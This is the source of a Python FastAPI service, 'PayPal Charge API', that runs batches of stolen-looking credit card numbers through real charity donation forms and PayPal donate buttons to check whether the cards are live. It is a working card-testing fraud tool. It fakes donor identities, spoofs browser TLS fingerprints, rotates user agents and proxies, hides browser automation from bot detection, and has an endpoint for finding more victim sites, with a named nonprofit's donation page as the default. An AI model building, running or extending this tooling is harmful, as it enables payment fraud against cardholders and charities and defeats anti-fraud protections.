"""
main.py — PayPal Charge API v1.0
===================================================

A REST API that charges credit cards through PayPal's
`approveGuestPaymentWithCreditCard` GraphQL mutation.

Two supported flows:
  1. GiveWP + PayPal Commerce (default) — server-side order creation via
     the GiveWP WordPress plugin's `give_paypal_commerce_create_order`
     admin-ajax endpoint, then card submitted to PayPal's GraphQL.
     Default site: binnaclehouse.org/donation/ (configurable).

  2. PayPal Donate Button — uses Playwright to render the donate SPA at
     `paypal.com/donate/?hosted_button_id=XXX`, captures the order token
     from network traffic, then submits card via PayPal's GraphQL.
     Enable by passing `?button_id=XXX` to /charge.

Endpoints:
  GET  /                   service info
  GET  /charge             charge a single card   (default $1 USD)
  POST /charge-batch       charge multiple cards
  GET  /discover           probe GiveWP+PayPal Commerce candidate sites
  GET  /test               test the GiveWP flow up to order creation (no card)
  GET  /donate-test        test PayPal donate button + Playwright (no card)

Example:
  curl 'http://localhost:8000/charge?cc=4242424242424242|12|28|123&amount=5.00'
  curl 'http://localhost:8000/charge?cc=4111111111111111|04|27|123&amount=2.50&button_id=TTWR92HZPWK6C'
  curl 'http://localhost:8000/discover'
  curl 'http://localhost:8000/test?site=https://binnaclehouse.org/donation/&amount=1.00'
"""

from __future__ import annotations

import asyncio
import json
import os
import sys
import time
import traceback
from typing import Any, Dict, List, Optional

from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from pydantic import BaseModel, Field

# Make local imports work both when run as a script and as a module
HERE = os.path.dirname(os.path.abspath(__file__))
if HERE not in sys.path:
    sys.path.insert(0, HERE)

import paypal_engine as engine  # noqa: E402

app = FastAPI(
    title="PayPal Charge API",
    version="1.0",
    description="PayPal GraphQL approveGuestPaymentWithCreditCard charge API",
)


# ============================================================
# Schemas
# ============================================================

class ChargeItem(BaseModel):
    cc: str = Field(..., description="CC|MM|YY|CVC (e.g. 4242...|12|28|123)")
    amount: float = Field(1.00, description="USD amount (default 1.00)")
    site: Optional[str] = Field(None, description="Override GiveWP+PayPal Commerce site URL")
    button_id: Optional[str] = Field(None, description="PayPal hosted_button_id (triggers donate-button flow)")
    proxy: Optional[str] = Field(None, description="HTTP proxy URL")

class BatchRequest(BaseModel):
    items: List[ChargeItem]


# ============================================================
# Routes
# ============================================================

@app.get("/")
def index():
    return {
        "service": "paypal-charger",
        "version": "1.0",
        "default_site": engine.GIVEWP_SITES[0]["name"],
        "default_amount": "1.00",
        "default_currency": "USD",
        "bypass_features": [
            "curl_cffi chrome131 (Chrome TLS fingerprint + JA3)",
            "Per-request Faker identity (name, email, phone, address)",
            "Random UA rotation from Chrome 131 pool",
            "Human-like delays (300-1200ms) between requests",
            "PayPal smart-card-fields Origin/Referer headers",
            "Multipart form-data for PayPal ajax endpoints",
            "Automatic card brand detection (VISA/MC/Amex/Discover/JCB/UnionPay)",
            "Playwright fallback for PayPal donate buttons",
        ],
        "endpoints": {
            "GET /charge":            "Charge a single card (CC|MM|YY|CVC, amount=1.00)",
            "POST /charge-batch":     "Charge multiple cards (body: {items:[...]})",
            "GET /discover":          "Probe GiveWP+PayPal Commerce candidate sites",
            "GET /test":              "Test GiveWP flow up to order creation (no card)",
            "GET /donate-test":       "Test PayPal donate button via Playwright (no card)",
            "GET /docs":              "Swagger UI",
        },
        "examples": {
            "give_wp_charge": "/charge?cc=4242424242424242|12|28|123&amount=1.00",
            "give_wp_charge_custom_amount": "/charge?cc=4242424242424242|12|28|123&amount=5.50",
            "give_wp_charge_custom_site": "/charge?cc=4242424242424242|12|28|123&site=https://example.org/donate/",
            "donate_button_charge": "/charge?cc=4242424242424242|12|28|123&button_id=TTWR92HZPWK6C",
        },
        "notes": (
            "If the default site's GiveWP form has been removed (binnaclehouse.org/donation/ "
            "currently has the [give_form id=3945] shortcode commented out), use /discover "
            "to find currently working GiveWP+PayPal Commerce sites, or pass button_id to "
            "use the PayPal donate button flow via Playwright."
        ),
    }


@app.get("/charge")
def charge(
    cc: str = Query(..., description="CC|MM|YY|CVC"),
    amount: float = Query(1.00, description="USD amount (default 1.00)"),
    site: Optional[str] = Query(None, description="GiveWP+PayPal Commerce site URL override"),
    button_id: Optional[str] = Query(None, description="PayPal hosted_button_id (donate-button flow)"),
    proxy: Optional[str] = Query(None, description="HTTP proxy"),
):
    """Charge a single card. Default site = binnaclehouse.org/donation/, default amount = $1.

    The response is a structured JSON dict with these top-level keys:
      - input         (card brand, last4, exp date)
      - site          (which site was used)
      - amount        (USD amount charged)
      - donor         (per-request Faker identity)
      - steps         (full step-by-step trace: get_page, process_donation, create_order, submit_card)
      - paypal_order_id  (EC-xxx token from PayPal, null if creation failed)
      - response      ("CHARGED" | "APPROVED" | "DECLINED" | "ERROR" | "UNKNOWN")
      - message       (human-readable explanation)
      - raw_response  (PayPal's JSON response to the charge)
      - duration_sec  (total wall-clock duration)
    """
    if button_id:
        # PayPal donate button flow via Playwright
        return _charge_via_donate_button(cc, amount, button_id, proxy)

    charger = engine.PayPalCharger(site=site, amount=amount, proxy=proxy)
    result = charger.charge(cc)
    return JSONResponse(content=result)


@app.post("/charge-batch")
def charge_batch(req: BatchRequest):
    """Charge multiple cards in sequence. Returns an array of results.
    Use POST with JSON body: {"items":[{"cc":"...","amount":1.00,"site":"..."},...]}
    """
    results = []
    for i, item in enumerate(req.items, 1):
        if item.button_id:
            res = _charge_via_donate_button(item.cc, item.amount, item.button_id, item.proxy)
        else:
            charger = engine.PayPalCharger(site=item.site, amount=item.amount, proxy=item.proxy)
            res = charger.charge(item.cc)
        res["batch_index"] = i
        results.append(res)
        # short delay between charges to look human
        time.sleep(1.0)
    return JSONResponse(content={"count": len(results), "results": results})


@app.get("/discover")
def discover():
    """Probe all configured GiveWP+PayPal Commerce candidate sites and return status.
    Use this to find a currently working site when the default site is broken.
    """
    sites = engine.discover_sites()
    working = [s for s in sites if s.get("tokens_extractable")]
    return JSONResponse(content={
        "checked": len(sites),
        "working_count": len(working),
        "sites": sites,
        "working": working,
    })


@app.get("/test")
def test_flow(
    site: Optional[str] = Query(None, description="GiveWP+PayPal Commerce site URL"),
    amount: float = Query(1.00, description="USD amount"),
    proxy: Optional[str] = Query(None, description="HTTP proxy"),
):
    """Test the GiveWP + PayPal Commerce flow up to PayPal order creation (no card submitted).
    Useful for verifying the site is functional before trying real cards.
    """
    result = engine.test_order_creation(site=site, amount=amount, proxy=proxy)
    return JSONResponse(content=result)


@app.get("/donate-test")
def donate_test(
    button_id: str = Query(..., description="PayPal hosted_button_id"),
    amount: float = Query(1.00, description="USD amount"),
):
    """Test the PayPal donate button flow via Playwright (creates PayPal order, no card).
    Returns the PayPal order token if successful.
    """
    result = asyncio.run(_donate_button_order_only(button_id, amount))
    return JSONResponse(content=result)


# ============================================================
# PayPal Donate Button flow (Playwright)
# ============================================================

def _charge_via_donate_button(cc: str, amount: float, button_id: str, proxy: Optional[str]) -> Dict[str, Any]:
    """Charge a card via PayPal donate button using Playwright to create the order,
    then submit card via PayPal GraphQL."""
    try:
        # Step 1: Use Playwright to get PayPal order token
        order_data = asyncio.run(_playwright_get_order_token(button_id, amount, proxy))
        if not order_data.get("order_token"):
            return {
                "input": {"cc": cc.split("|")[0] if "|" in cc else cc, "amount": amount},
                "button_id": button_id,
                "site": f"paypal.com/donate/?hosted_button_id={button_id}",
                "amount": f"{amount:.2f}",
                "steps": {"playwright_load": order_data},
                "paypal_order_id": None,
                "response": "ERROR",
                "message": f"Failed to obtain PayPal order token via Playwright: {order_data.get('error','')}",
                "raw_response": order_data,
                "duration_sec": order_data.get("duration_sec", 0),
            }
        order_token = order_data["order_token"]

        # Step 2: Submit card to PayPal GraphQL using curl_cffi
        parsed = engine._parse_cc(cc)
        if not parsed:
            return {"response": "ERROR", "message": "Invalid CC format. Use CC|MM|YY|CVC."}
        charger = engine.PayPalCharger(amount=amount, proxy=proxy)
        # build donor identity
        first = engine.faker.first_name()
        last = engine.faker.last_name()
        donor = {
            "first_name": first,
            "last_name": last,
            "email": engine._gen_email(first, last),
            "title": "Mr.",
        }
        # bypass the GiveWP site config — use PayPal's own endpoints
        info = charger._submit_card_to_paypal(
            order_token,
            parsed["cc"], parsed["mm"], parsed["yy"], parsed["cvc"],
            donor,
        )
        # interpret
        out = {
            "input": {
                "cc": parsed["cc"],
                "mm": parsed["mm"],
                "yy": parsed["yy"],
                "cvc": parsed["cvc"],
                "card_brand": engine._detect_card_type(parsed["cc"]),
                "last4": parsed["cc"][-4:],
            },
            "button_id": button_id,
            "site": f"paypal.com/donate/?hosted_button_id={button_id}",
            "amount": f"{amount:.2f}",
            "donor": donor,
            "steps": {"playwright_load": order_data, "submit_card": info},
            "paypal_order_id": order_token,
            "raw_response": info.get("json") or info.get("raw_body"),
            "response": "UNKNOWN",
            "message": "",
            "duration_sec": order_data.get("duration_sec", 0),
        }
        j = info.get("json") or {}
        if j.get("data", {}).get("approveGuestPaymentWithCreditCard"):
            out["response"] = "CHARGED"
            out["message"] = "Payment successfully charged via PayPal donate button."
        elif "errors" in j and j["errors"]:
            first_err = j["errors"][0]
            msg = first_err.get("message", "Unknown error")
            code = ""
            details = first_err.get("data") or []
            if details and isinstance(details, list) and details:
                code = (details[0] or {}).get("code", "")
            full_err = f"{msg} ({code})" if code else msg
            if any(kw in full_err.upper() for kw in engine.LIVE_DECLINE_KEYWORDS):
                out["response"] = "APPROVED"
                out["message"] = f"Card is LIVE but PayPal declined further action: {full_err}"
            else:
                out["response"] = "DECLINED"
                out["message"] = f"Card declined by PayPal: {full_err}"
        else:
            out["response"] = "UNKNOWN"
            out["message"] = f"Unexpected PayPal response: {info.get('raw_body','')[:200]}"
        return out
    except Exception as e:
        tb = traceback.format_exc()
        return {
            "button_id": button_id,
            "response": "ERROR",
            "message": f"Donate-button charge failed: {type(e).__name__}: {e}",
            "traceback": tb[-800:],
        }


async def _playwright_get_order_token(button_id: str, amount: float, proxy: Optional[str]) -> Dict[str, Any]:
    """Use Playwright to load paypal.com/donate/?hosted_button_id=XXX, fill amount,
    click 'Donate with Debit or Credit Card', capture the createOrder GraphQL call
    and extract the PayPal order token (paypal-client-context header)."""
    from playwright.async_api import async_playwright

    url = f"https://www.paypal.com/donate/?hosted_button_id={button_id}"
    t0 = time.time()
    captured = []
    async with async_playwright() as p:
        launch_args = [
            "--no-sandbox", "--disable-blink-features=AutomationControlled",
            "--disable-dev-shm-usage",
        ]
        browser = await p.chromium.launch(headless=True, args=launch_args)
        ctx_kwargs = {
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "viewport": {"width": 1360, "height": 900},
            "locale": "en-US",
        }
        if proxy:
            ctx_kwargs["proxy"] = {"server": proxy}
        ctx = await browser.new_context(**ctx_kwargs)
        await ctx.add_init_script("""
            Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
            Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});
            Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
            Object.defineProperty(navigator,'platform',{get:()=>'Win32'});
        """)
        page = await ctx.new_page()
        async def on_response(resp):
            u = resp.url
            if "/graphql" in u or "createOrder" in u or "smart-card-fields" in u:
                try:
                    body = await resp.text()
                except:
                    body = "<binary>"
                try:
                    req_body = resp.request.post_data
                except:
                    req_body = None
                captured.append({
                    "url": u[:300],
                    "status": resp.status,
                    "method": resp.request.method,
                    "req_body": (req_body or "")[:1500] if resp.request.method in ("POST","PUT","PATCH") else "",
                    "resp_body": body[:2500],
                    "resp_headers": {k:v for k,v in resp.headers.items() if k.lower() in (
                        "paypal-client-context","paypal-client-metadata-id","x-app-name",
                        "content-type","location","x-correlation-id"
                    )}
                })
        page.on("response", on_response)
        try:
            r = await page.goto(url, wait_until="domcontentloaded", timeout=45000)
        except Exception as e:
            await browser.close()
            return {"error": f"goto failed: {e}", "duration_sec": round(time.time()-t0, 2)}
        await page.wait_for_timeout(15000)
        # Accept cookie banner if present
        try:
            await page.click("#acceptAllButton", timeout=3000)
        except: pass
        # Fill amount
        try:
            await page.fill("#text-input-myHeroCurrency", str(amount))
        except Exception as e:
            await browser.close()
            return {"error": f"amount fill failed: {e}", "duration_sec": round(time.time()-t0, 2)}
        await page.wait_for_timeout(500)
        # Click payWithGuest
        try:
            await page.click("#payWithGuest", timeout=5000)
        except Exception as e:
            await browser.close()
            return {"error": f"click failed: {e}", "duration_sec": round(time.time()-t0, 2)}
        # Wait for createOrder GraphQL call to come back
        await page.wait_for_timeout(20000)
        await browser.close()

    # Look through captured responses for PayPal order token
    order_token = None
    for c in captured:
        # Order token appears as 'paypal-client-context' response header on /graphql?createOrder
        ctx_header = c.get("resp_headers", {}).get("paypal-client-context")
        if ctx_header:
            order_token = ctx_header
            break
        # Or as a field in the response body
        body = c.get("resp_body", "")
        m = None
        if not m: m = __import__("re").search(r'"contextId":"([^"]+)"', body)
        if not m: m = __import__("re").search(r'"orderId":"([^"]+)"', body)
        if not m: m = __import__("re").search(r'("token":"EC-[A-Z0-9]+")', body)
        if not m: m = __import__("re").search(r'(EC-[A-Z0-9]{17,})', body)
        if m:
            order_token = m.group(1)
            break
    return {
        "button_id": button_id,
        "amount": amount,
        "captured_responses_count": len(captured),
        "captured": captured[:5],
        "order_token": order_token,
        "duration_sec": round(time.time()-t0, 2),
    }


async def _donate_button_order_only(button_id: str, amount: float) -> Dict[str, Any]:
    """Wrapper for /donate-test endpoint — only creates the order, no card."""
    return await _playwright_get_order_token(button_id, amount, None)


# ============================================================
# Entry point
# ============================================================

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
